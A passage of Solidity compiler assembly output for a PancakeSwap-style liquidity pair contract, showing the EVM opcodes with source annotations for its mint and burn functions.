swap2\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":5505:5511  token1 */\n      dup7\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_208\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_208:\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_209\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_209:\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_210\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_210:\n      pop\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"Pair.sol\":5547:5559  uint amount0 */\n      0x00\n        /* \"Pair.sol\":5562:5585  balance0.sub(_reserve0) */\n      tag_211\n        /* \"Pair.sol\":5562:5570  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":5562:5585  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":5562:5574  balance0.sub */\n      tag_177\n        /* \"Pair.sol\":5562:5585  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_211:\n        /* \"Pair.sol\":5547:5585  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"Pair.sol\":5595:5607  uint amount1 */\n      0x00\n        /* \"Pair.sol\":5610:5633  balance1.sub(_reserve1) */\n      tag_212\n        /* \"Pair.sol\":5610:5618  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":5610:5633  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":5610:5622  balance1.sub */\n      tag_177\n        /* \"Pair.sol\":5610:5633  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_212:\n        /* \"Pair.sol\":5595:5633  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"Pair.sol\":5644:5654  bool feeOn */\n      0x00\n        /* \"Pair.sol\":5657:5687  _mintFee(_reserve0, _reserve1) */\n      tag_213\n        /* \"Pair.sol\":5666:5675  _reserve0 */\n      dup8\n        /* \"Pair.sol\":5677:5686  _reserve1 */\n      dup8\n        /* \"Pair.sol\":5657:5665  _mintFee */\n      tag_214\n        /* \"Pair.sol\":5657:5687  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_213:\n        /* \"Pair.sol\":5697:5714  uint _totalSupply */\n      0x00\n        /* \"Pair.sol\":5717:5728  totalSupply */\n      sload\n        /* \"Pair.sol\":5644:5687  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"Pair.sol\":5820:5837  _totalSupply == 0 */\n      dup1\n        /* \"Pair.sol\":5816:6210  if (_totalSupply == 0) {... */\n      tag_215\n      jumpi\n        /* \"Pair.sol\":5865:5919  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_216\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":5865:5896  Math.sqrt(amount0.mul(amount1)) */\n      tag_176\n        /* \"Pair.sol\":5875:5895  amount0.mul(amount1) */\n      tag_218\n        /* \"Pair.sol\":5875:5882  amount0 */\n      dup8\n        /* \"Pair.sol\":5887:5894  amount1 */\n      dup8\n        /* \"Pair.sol\":5875:5895  amount0.mul(amount1) */\n      0xffffffff\n        /* \"Pair.sol\":5875:5886  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":5875:5895  amount0.mul(amount1) */\n      and\n      jump\t// in\n    tag_218:\n        /* \"Pair.sol\":5865:5874  Math.sqrt */\n      tag_219\n        /* \"Pair.sol\":5865:5896  Math.sqrt(amount0.mul(amount1)) */\n      jump\t// in\n        /* \"Pair.sol\":5865:5919  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_216:\n        /* \"Pair.sol\":5853:5919  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"Pair.sol\":5933:5969  _mint(address(0), MINIMUM_LIQUIDITY) */\n      tag_220\n        /* \"Pair.sol\":5947:5948  0 */\n      0x00\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":5933:5938  _mint */\n      tag_221\n        /* \"Pair.sol\":5933:5969  _mint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_220:\n        /* \"Pair.sol\":5816:6210  if (_totalSupply == 0) {... */\n      jump(tag_222)\n    tag_215:\n        /* \"Pair.sol\":6067:6199  Math.min(... */\n      tag_223\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6093:6130  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"Pair.sol\":6093:6118  amount0.mul(_totalSupply) */\n      tag_224\n        /* \"Pair.sol\":6093:6100  amount0 */\n      dup7\n        /* \"Pair.sol\":6105:6117  _totalSupply */\n      dup5\n        /* \"Pair.sol\":6093:6118  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"Pair.sol\":6093:6104  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":6093:6118  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_224:\n        /* \"Pair.sol\":6093:6130  amount0.mul(_totalSupply) / _reserve0 */\n      dup2\n      tag_225\n      jumpi\n      invalid\n    tag_225:\n      div\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6148:6185  amount1.mul(_totalSupply) / _reserve1 */\n      dup10\n      and\n        /* \"Pair.sol\":6148:6173  amount1.mul(_totalSupply) */\n      tag_226\n        /* \"Pair.sol\":6148:6155  amount1 */\n      dup7\n        /* \"Pair.sol\":6160:6172  _totalSupply */\n      dup6\n        /* \"Pair.sol\":6148:6173  amount1.mul(_totalSupply) */\n      0xffffffff\n        /* \"Pair.sol\":6148:6159  amount1.mul */\n      tag_175\n        /* \"Pair.sol\":6148:6173  amount1.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_226:\n        /* \"Pair.sol\":6148:6185  amount1.mul(_totalSupply) / _reserve1 */\n      dup2\n      tag_227\n      jumpi\n      invalid\n    tag_227:\n      div\n        /* \"Pair.sol\":6067:6075  Math.min */\n      tag_228\n        /* \"Pair.sol\":6067:6199  Math.min(... */\n      jump\t// in\n    tag_223:\n        /* \"Pair.sol\":6055:6199  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"Pair.sol\":5816:6210  if (_totalSupply == 0) {... */\n    tag_222:\n        /* \"Pair.sol\":6239:6240  0 */\n      0x00\n        /* \"Pair.sol\":6227:6236  liquidity */\n      dup10\n        /* \"Pair.sol\":6227:6240  liquidity > 0 */\n      gt\n        /* \"Pair.sol\":6219:6283  require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_229\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_229:\n        /* \"Pair.sol\":6293:6313  _mint(to, liquidity) */\n      tag_230\n        /* \"Pair.sol\":6299:6301  to */\n      dup11\n        /* \"Pair.sol\":6303:6312  liquidity */\n      dup11\n        /* \"Pair.sol\":6293:6298  _mint */\n      tag_221\n        /* \"Pair.sol\":6293:6313  _mint(to, liquidity) */\n      jump\t// in\n    tag_230:\n        /* \"Pair.sol\":6324:6373  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_231\n        /* \"Pair.sol\":6332:6340  balance0 */\n      dup7\n        /* \"Pair.sol\":6342:6350  balance1 */\n      dup7\n        /* \"Pair.sol\":6352:6361  _reserve0 */\n      dup11\n        /* \"Pair.sol\":6363:6372  _reserve1 */\n      dup11\n        /* \"Pair.sol\":6324:6331  _update */\n      tag_186\n        /* \"Pair.sol\":6324:6373  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_231:\n        /* \"Pair.sol\":6387:6392  feeOn */\n      dup2\n        /* \"Pair.sol\":6383:6430  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_232\n      jumpi\n        /* \"Pair.sol\":6421:6429  reserve1 */\n      sload(0x0b)\n        /* \"Pair.sol\":6402:6430  uint(reserve0).mul(reserve1) */\n      tag_233\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6407:6415  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":6421:6429  reserve1 */\n      swap1\n      div\n      and\n        /* \"Pair.sol\":6402:6430  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"Pair.sol\":6402:6420  uint(reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":6402:6430  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_233:\n        /* \"Pair.sol\":6394:6399  kLast */\n      0x0e\n        /* \"Pair.sol\":6394:6430  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"Pair.sol\":6383:6430  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_232:\n        /* \"Pair.sol\":6485:6519  Mint(msg.sender, amount0, amount1) */\n      0x40\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup6\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"Pair.sol\":6490:6500  msg.sender */\n      caller\n      swap3\n        /* \"Pair.sol\":6485:6519  Mint(msg.sender, amount0, amount1) */\n      0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f\n      swap3\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log2\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n      pop\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n      swap5\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_91:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":1010:1027  uint public kLast */\n    tag_93:\n      sload(0x0e)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_96:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":8025:9454  function burn(... */\n    tag_99:\n        /* \"Pair.sol\":8088:8100  uint amount0 */\n      0x00\n        /* \"Pair.sol\":8102:8114  uint amount1 */\n      dup1\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_235\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_235:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"Pair.sol\":1259:1260  0 */\n      dup1\n        /* \"Pair.sol\":8169:8182  getReserves() */\n      tag_237\n        /* \"Pair.sol\":8169:8180  getReserves */\n      tag_56\n        /* \"Pair.sol\":8169:8182  getReserves() */\n      jump\t// in\n    tag_237:\n      pop\n        /* \"Pair.sol\":8225:8231  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":8274:8280  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":8355:8359  this */\n      address\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":8126:8182  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap5\n      swap7\n      pop\n      swap3\n      swap5\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":8225:8231  token0 */\n      swap2\n      dup3\n      and\n      swap4\n        /* \"Pair.sol\":8274:8280  token1 */\n      swap2\n      and\n      swap2\n        /* \"Pair.sol\":8207:8222  address _token0 */\n      0x00\n      swap2\n        /* \"Pair.sol\":8225:8231  token0 */\n      dup5\n      swap2\n        /* \"Pair.sol\":8321:8346  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":8225:8231  token0 */\n      dup7\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_238\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_238:\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_239\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_239:\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_240\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_240:\n      pop\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":8421:8425  this */\n      address\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"Pair.sol\":8371:8384  uint balance1 */\n      0x00\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":8387:8412  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":8387:8412  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_241\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_241:\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_242\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_242:\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_243\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_243:\n      pop\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":8472:8476  this */\n      address\n        /* \"Pair.sol\":8437:8451  uint liquidity */\n      0x00\n        /* \"Pair.sol\":8454:8478  balanceOf[address(this)] */\n      swap1\n      dup2\n      mstore\n        /* \"Pair.sol\":8454:8463  balanceOf */\n      0x01\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x20\n        /* \"Pair.sol\":8454:8478  balanceOf[address(this)] */\n      mstore\n      0x40\n      dup2\n      keccak256\n      sload\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"Pair.sol\":8502:8532  _mintFee(_reserve0, _reserve1) */\n      tag_244\n        /* \"Pair.sol\":8511:8520  _reserve0 */\n      dup9\n        /* \"Pair.sol\":8522:8531  _reserve1 */\n      dup9\n        /* \"Pair.sol\":8502:8510  _mintFee */\n      tag_214\n        /* \"Pair.sol\":8502:8532  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_244:\n        /* \"Pair.sol\":8542:8559  uint _totalSupply */\n      0x00\n        /* \"Pair.sol\":8562:8573  totalSupply */\n      sload\n        /* \"Pair.sol\":8489:8532  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"Pair.sol\":8562:8573  totalSupply */\n      dup1\n        /* \"Pair.sol\":8671:8694  liquidity.mul(balance0) */\n      tag_245\n        /* \"Pair.sol\":8671:8680  liquidity */\n      dup5\n        /* \"Pair.sol\":8685:8693  balance0 */\n      dup8\n        /* \"Pair.sol\":8671:8694  liquidity.mul(balance0) */\n      0xffffffff\n        /* \"Pair.sol\":8671:8684  liquidity.mul */\n      tag_175\n        /* \"Pair.sol\":8671:8694  liquidity.mul(balance0) */\n      and\n      jump\t// in\n    tag_245:\n        /* \"Pair.sol\":8671:8709  liquidity.mul(balance0) / _totalSupply */\n      dup2\n      tag_246\n      jumpi\n      invalid\n    tag_246:\n      div\n      swap11\n      pop\n        /* \"Pair.sol\":8803:8815  _totalSupply */\n      dup1\n        /* \"Pair.sol\":8777:8800  liquidity.mul(balance1) */\n      tag_247\n        /* \"Pair.sol\":8777:8786  liquidity */\n      dup5\n        /* \"Pair.sol\":8791:8799  balance1 */\n      dup7\n        /* \"Pair.sol\":8777:8800  liquidity.mul(balance1) */\n      0xffffffff\n        /* \"Pair.sol\":8777:8790  liquidity.mul */\n      tag_175\n        /* \"Pair.sol\":8777:8800  liquidity.mul(balance1) */\n      and\n      jump\t// in\n    tag_247:\n        /* \"Pair.sol\":8777:8815  liquidity.mul(balance1) / _totalSupply */\n      dup2\n      tag_248\n      jumpi\n      invalid\n    tag_248:\n      div\n        /* \"Pair.sol\":8767:8815  amount1 = liquidity.mul(balance1) / _totalSupply */\n      swap10\n      pop\n        /* \"Pair.sol\":8904:8905  0 */\n      0x00\n        /* \"Pair.sol\":8894:8901  amount0 */\n      dup12\n        /* \"Pair.sol\":8894:8905  amount0 > 0 */\n      gt\n        /* \"Pair.sol\":8894:8920  amount0 > 0 && amount1 > 0 */\n      dup1\n      iszero\n      tag_249\n      jumpi\n      pop\n        /* \"Pair.sol\":8919:8920  0 */\n      0x00\n        /* \"Pair.sol\":8909:8916  amount1 */\n      dup11\n        /* \"Pair.sol\":8909:8920  amount1 > 0 */\n      gt\n        /* \"Pair.sol\":8894:8920  amount0 > 0 && amount1 > 0 */\n    tag_249:\n        /* \"Pair.sol\":8873:8984  require(... */\n      tag_250\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_250:\n        /* \"Pair.sol\":8994:9025  _burn(address(this), liquidity) */\n      tag_251\n        /* \"Pair.sol\":9008:9012  this */\n      address\n        /* \"Pair.sol\":9015:9024  liquidity */\n      dup5\n        /* \"Pair.sol\":8994:8999  _burn */\n      tag_252\n        /* \"Pair.sol\":8994:9025  _burn(address(this), liquidity) */\n      jump\t// in\n    tag_251:\n        /* \"Pair.sol\":9035:9070  _safeTransfer(_token0, to, amount0) */\n      tag_253\n        /* \"Pair.sol\":9049:9056  _token0 */\n      dup8\n        /* \"Pair.sol\":9058:9060  to */\n      dup14\n        /* \"Pair.sol\":9062:9069  amount0 */\n      dup14\n        /* \"Pair.sol\":9035:9048  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":9035:9070  _safeTransfer(_token0, to, amount0) */\n      jump\t// in\n    tag_253:\n        /* \"Pair.sol\":9080:9115  _safeTransfer(_token1, to, amount1) */\n      tag_254\n        /* \"Pair.sol\":9094:9101  _token1 */\n      dup7\n        /* \"Pair.sol\":9103:9105  to */\n      dup14\n        /* \"Pair.sol\":9107:9114  amount1 */\n      dup13\n        /* \"Pair.sol\":9080:9093  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":9080:9115  _safeTransfer(_token1, to, amount1) */\n      jump\t// in\n    tag_254:\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":9170:9174  this */\n      address\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":9136:9161  IERC20(_token0).balanceOf */\n      dup10\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":9136:9161  IERC20(_token0).balanceOf */\n      dup7\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_255\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_255:\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_256\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_256:\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_257\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_257:\n      pop\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":9231:9235  this */\n      address\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap7\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":9197:9222  IERC20(_token1).balanceOf */\n      dup9\n      and\n      